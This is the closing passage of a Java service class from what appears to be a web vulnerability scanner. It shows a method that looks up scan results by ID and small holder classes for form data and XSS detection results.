            // Fallback
        }
        return url;
    }

    /**
     * Get results by scan ID
     */
    public List<ScanResult> getResultsByScanId(String scanId) {
        return scanResultRepository.findByScanId(scanId);
    }

    /**
     * Form data holder
     */
    private static class FormData {
        String action;
        String method = "GET";
        Map<String, String> parameters = new HashMap<>();
    }

    /**
     * XSS detection result holder
     */
    private static class XssDetectionResult {
        boolean isVulnerable;
        String evidence;
        String riskLevel;
    }
}